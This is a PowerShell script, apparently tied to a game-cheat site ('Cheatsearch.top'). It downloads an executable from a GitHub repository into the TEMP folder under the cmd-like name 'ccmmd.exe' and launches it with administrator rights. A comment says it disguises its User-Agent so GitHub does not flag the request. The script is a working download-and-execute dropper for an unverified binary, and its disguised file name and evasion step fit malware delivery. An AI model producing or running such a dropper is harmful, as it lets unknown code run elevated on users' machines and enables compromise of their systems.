Clear
Write-Host "--- Debug Mode: Cheatsearch.top ---" -ForegroundColor Yellow

# 1. Проверка прав администратора
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ОШИБКА: Скрипт запущен БЕЗ прав администратора!" -ForegroundColor Red
    Write-Host "[!] Запустите PowerShell от имени администратора." -ForegroundColor Yellow
}

# 2. Настройка путей (используем TEMP для надежности записи)
$outputFile = "$env:TEMP\ccmmd.exe" 
Write-Host "[+] Путь для сохранения: $outputFile" -ForegroundColor Gray

# 3. Попытка скачивания
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
Write-Host "[*] Начинаю скачивание..." -ForegroundColor Cyan

try {
    $webClient = New-Object System.Net.WebClient
    # Упростим User-Agent, чтобы GitHub не счел его подозрительным
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($url, $outputFile)
    Write-Host "[+] Файл успешно скачан." -ForegroundColor Green
} catch {
    Write-Host "[-] ОШИБКА СКАЧИВАНИЯ: $($_.Exception.Message)" -ForegroundColor Red
}

# 4. Проверка наличия файла перед запуском
if (Test-Path $outputFile) {
    Write-Host "[*] Попытка запуска файла..." -ForegroundColor Cyan
    try {
        # Пробуем запустить и ждем немного, чтобы увидеть, не вылетит ли ошибка
        $process = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -ErrorAction Stop
        Write-Host "[+] Процесс запущен (ID: $($process.Id))" -ForegroundColor Green
    } catch {
        Write-Host "[-] ОШИБКА ЗАПУСКА: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "[-] ОШИБКА: Файл не найден на диске, запуск невозможен." -ForegroundColor Red
}

Write-Host "--- Конец проверки ---" -ForegroundColor Yellow
pause
